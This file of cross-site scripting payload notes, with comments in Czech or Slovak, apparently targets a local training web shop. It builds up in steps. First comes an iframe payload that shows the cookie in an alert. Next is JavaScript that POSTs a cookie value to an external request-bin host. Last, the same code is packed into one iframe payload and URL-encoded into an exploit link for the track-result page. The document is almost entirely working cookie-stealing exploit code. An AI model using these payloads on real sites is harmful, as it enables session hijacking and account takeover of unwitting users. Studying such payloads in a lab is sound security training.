// 1. Cokkie v alerte

<iframe src="javascript:alert(document.cookie.split("")[4].split("=")[1])"></iframe>;


// 2.0 Cokkie do RequestBinu v tele HTTP requestu 
// https://pipedream.com/@mvetrik1/projects/proj_x9s5L3B/requestbin-p_YyCgabo/inspect/2ZSFZYXkDISyJwBaPUDQNZ3vxES

const headers = new Headers();
headers.append("Content-Type", "text/plain");

const body = {
  test: "event",
};

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: document.cookie.split("")[4].split("=")[1],
};

fetch("https://eojph9o2kgja7k2.m.pipedream.net", options);

// 2.1 One line code
<iframe src="javascript:const headers = new Headers();headers.append(`Content-Type`, `text/plain`);const body = {test: `event`,};const options = {method: `POST`,headers,mode: `cors`,body: document.cookie.split(` `)[4].split(`=`)[1],};fetch(`https://eojph9o2kgja7k2.m.pipedream.net`, options);"></iframe>;


// 2.2 Encoded for url
http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aconst%20headers%20%3D%20new%20Headers()%3Bheaders.append(%60Content-Type%60%2C%20%60text%2Fplain%60)%3Bconst%20body%20%3D%20%7Btest%3A%20%60event%60%2C%7D%3Bconst%20options%20%3D%20%7Bmethod%3A%20%60POST%60%2Cheaders%2Cmode%3A%20%60cors%60%2Cbody%3A%20document.cookie.split(%60%20%60)%5B4%5D.split(%60%3D%60)%5B1%5D%7D%3Bfetch(%60https%3A%2F%2Feojph9o2kgja7k2.m.pipedream.net%60%2C%20options)%3B%22%3E%3C%2Fiframe%3E
